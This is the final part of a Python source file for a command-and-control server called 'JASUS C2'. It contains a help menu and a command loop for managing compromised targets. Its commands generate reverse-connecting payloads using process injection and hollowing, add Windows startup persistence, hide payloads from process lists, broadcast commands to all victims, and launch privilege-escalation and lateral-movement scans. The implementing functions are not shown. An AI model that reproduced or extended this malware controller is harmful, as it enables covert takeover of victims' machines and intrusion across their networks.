{Fore.GREEN}Target Management:{Style.RESET_ALL}
  targets                    - List all active targets
  interact <target_id>       - Enter interactive shell with target
  broadcast <command>        - Send command to all targets

{Fore.GREEN}Post-Exploitation:{Style.RESET_ALL}
  privesc <target_id>        - Run automated privilege escalation pentest
  latmov <target_id>         - Run automated lateral movement pentest
  reports                    - List all saved reports

{Fore.GREEN}Payload Generation:{Style.RESET_ALL}
  generate <ip> <port> [-p]  - Generate basic payload with hardcoded IP (-p for persistence)
  generate_pi <ip> <port> <target_process> [-p] - Generate process injection payload into specified process
  generate_ph <ip> <port> <target_process> [-p] - Generate process hollowing payload (spawns target process)
  generate_download <ip> <port> <url> [-p] - Generate payload that downloads IP from URL

{Fore.GREEN}Examples:{Style.RESET_ALL}
  privesc target_1           - Run privilege escalation scan on target_1
  latmov target_1            - Run lateral movement scan from target_1
  generate_pi 10.0.3.4 443 svchost
  generate_ph 10.0.3.4 443 notepad -p

{Fore.GREEN}Special Commands:{Style.RESET_ALL}
  ghost <IP> <target_id>     - Kill all established connections from IP on target
  self_destroy <target_id>   - Remotely delete the payload
  zombie_mode <target_id>    - Hide payload from process lists
  add_persistence <target_id> - Add to Windows startup

{Fore.GREEN}System Commands:{Style.RESET_ALL}
  help                       - Show this help menu
  clear                      - Clear screen
  exit                       - Exit C2 framework

{Fore.YELLOW}Example Usage:{Style.RESET_ALL}
  > listen 443
  > generate 192.168.1.100 443 -p
  > targets
  > interact target_1
  > ghost 10.0.3.4 target_1
  > privesc target_1
  > latmov target_1
"""
        print(help_text)
    
    def run(self):
        print(f"""
{Fore.GREEN}
     ██╗ █████╗ ███████╗██╗   ██╗███████╗     ██████╗██████╗                                                    
     ██║██╔══██╗██╔════╝██║   ██║██╔════╝    ██╔════╝╚════██╗                                                   
     ██║███████║███████╗██║   ██║███████╗    ██║      █████╔╝                                                   
██   ██║██╔══██║╚════██║██║   ██║╚════██║    ██║     ██╔═══╝                                                    
╚█████╔╝██║  ██║███████║╚██████╔╝███████║    ╚██████╗███████╗                                                   
 ╚════╝ ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚══════╝     ╚═════╝╚══════╝                                                   
        ╔══════════════════════════════════════════╗                                                            
        ║     C2 Framework - Command & Control     ║                                                            
        ║       Enhanced with Post-Exploitation     ║                                                            
        ╚══════════════════════════════════════════╝
{Style.RESET_ALL}
Type 'help' for available commands
        """)
        
        while self.running:
            try:
                cmd_input = input(f"{Fore.GREEN}C2> {Style.RESET_ALL}").strip()
                
                if not cmd_input:
                    continue
                
                self.command_history.append(cmd_input)
                parts = cmd_input.split()
                command = parts[0].lower()
                
                if command == 'help':
                    self.show_help()
                
                elif command == 'clear':
                    os.system('cls' if os.name == 'nt' else 'clear')
                
                elif command == 'exit':
                    self.cleanup()
                    self.running = False
                
                elif command == 'listen':
                    if len(parts) > 1:
                        try:
                            port = int(parts[1])
                            self.start_listener(port)
                        except ValueError:
                            print(f"{Fore.RED}[-] Invalid port number")
                    else:
                        print(f"{Fore.YELLOW}[!] Usage: listen <port>")
                
                elif command == 'listeners':
                    if self.listeners:
                        print(f"\n{Fore.CYAN}{'Port':<10} {'Status':<10}")
                        print(f"{'-'*25}")
                        for lid, info in self.listeners.items():
                            print(f"{info['port']:<10} {'Active' if info['active'] else 'Stopped'}")
                        print()
                    else:
                        print(f"{Fore.YELLOW}[!] No active listeners")
                
                elif command == 'stop':
                    if len(parts) > 1:
                        try:
                            port = int(parts[1])
                            self.stop_listener(port)
                        except ValueError:
                            print(f"{Fore.RED}[-] Invalid port number")
                    else:
                        print(f"{Fore.YELLOW}[!] Usage: stop <port>")
                
                elif command == 'targets':
                    self.list_targets()
                
                elif command == 'interact':
                    if len(parts) > 1:
                        self.interactive_shell(parts[1])
                    else:
                        print(f"{Fore.YELLOW}[!] Usage: interact <target_id>")
                
                elif command == 'broadcast':
                    if len(parts) > 1:
                        cmd_to_send = ' '.join(parts[1:])
                        self.broadcast_command(cmd_to_send)
                    else:
                        print(f"{Fore.YELLOW}[!] Usage: broadcast <command>")
                
                elif command == 'privesc':
                    if len(parts) > 1:
                        target_id = parts[1]
                        print(f"{Fore.YELLOW}[!] Starting privilege escalation scan on {target_id}...")
                        print(f"{Fore.YELLOW}[!] This will take 30-60 seconds...")
                        self.run_privesc_scan(target_id)
                    else:
                        print(f"{Fore.YELLOW}[!] Usage: privesc <target_id>")
                
                elif command == 'latmov':
                    if len(parts) > 1:
                        target_id = parts[1]
                        print(f"{Fore.YELLOW}[!] Starting lateral movement scan on {target_id}...")
                        print(f"{Fore.YELLOW}[!] This will take 30-60 seconds...")
                        self.run_lateral_movement_scan(target_id)
                    else:
                        print(f"{Fore.YELLOW}[!] Usage: latmov <target_id>")
                
                elif command == 'reports':
                    reports_dir = f"{self.c2_directory}/reports"
                    if os.path.exists(reports_dir):
                        reports = os.listdir(reports_dir)
                        if reports:
                            print(f"\n{Fore.CYAN}Saved Reports:")
                            for report in sorted(reports):
                                print(f"  - {report}")
                            print()
                        else:
                            print(f"{Fore.YELLOW}[!] No reports found")
                    else:
                        print(f"{Fore.YELLOW}[!] No reports directory found")
                
                elif command == 'generate':
                    if len(parts) >= 3:
                        ip = parts[1]
                        port = parts[2]
                        persistence = '-p' in parts
                        self.generate_payload(ip, port, persistence)
                    else:
                        print(f"{Fore.YELLOW}[!] Usage: generate <ip> <port> [-p]")
                
                elif command == 'generate_pi':
                    if len(parts) >= 4:
                        ip = parts[1]
                        port = parts[2]
                        target_process = parts[3]
                        persistence = '-p' in parts
                        self.generate_process_injection_payload(ip, port, target_process, persistence)
                    else:
                        print(f"{Fore.YELLOW}[!] Usage: generate_pi <ip> <port> <target_process> [-p]")
                        print(f"{Fore.YELLOW}[!] Example: generate_pi 10.0.3.4 443 svchost")
                
                elif command == 'generate_ph':
                    if len(parts) >= 4:
                        ip = parts[1]
                        port = parts[2]
                        target_process = parts[3]
                        persistence = '-p' in parts
                        self.generate_process_hollowing_payload(ip, port, target_process, persistence)
                    else:
                        print(f"{Fore.YELLOW}[!] Usage: generate_ph <ip> <port> <target_process> [-p]")
                        print(f"{Fore.YELLOW}[!] Example: generate_ph 10.0.3.4 443 notepad")
                
                elif command == 'generate_download':
                    if len(parts) >= 4:
                        ip = parts[1]
                        port = parts[2]
                        url = parts[3]
                        persistence = '-p' in parts
                        self.generate_payload_with_download(ip, port, url, persistence)
                    else:
                        print(f"{Fore.YELLOW}[!] Usage: generate_download <ip> <port> <url> [-p]")
                
                elif command == 'ghost':
                    if len(parts) >= 3:
                        ip = parts[1]
                        target_id = parts[2]
                        self.ghost_command(target_id, ip)
                    else:
                        print(f"{Fore.YELLOW}[!] Usage: ghost <IP> <target_id>")
                
                elif command == 'self_destroy':
                    if len(parts) > 1:
                        self.self_destroy(parts[1])
                    else:
                        print(f"{Fore.YELLOW}[!] Usage: self_destroy <target_id>")
                
                elif command == 'zombie_mode':
                    if len(parts) > 1:
                        self.zombie_mode(parts[1])
                    else:
                        print(f"{Fore.YELLOW}[!] Usage: zombie_mode <target_id>")
                
                elif command == 'add_persistence':
                    if len(parts) > 1:
                        self.add_persistence(parts[1])
                    else:
                        print(f"{Fore.YELLOW}[!] Usage: add_persistence <target_id>")
                
                else:
                    print(f"{Fore.RED}[-] Unknown command: {command}")
                    print(f"Type 'help' for available commands")
                
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}[!] Press Ctrl+C again to exit, or type 'exit'")
            except Exception as e:
                print(f"{Fore.RED}[-] Error: {e}")

if __name__ == "__main__":
    c2 = C2Server()
    c2.run()
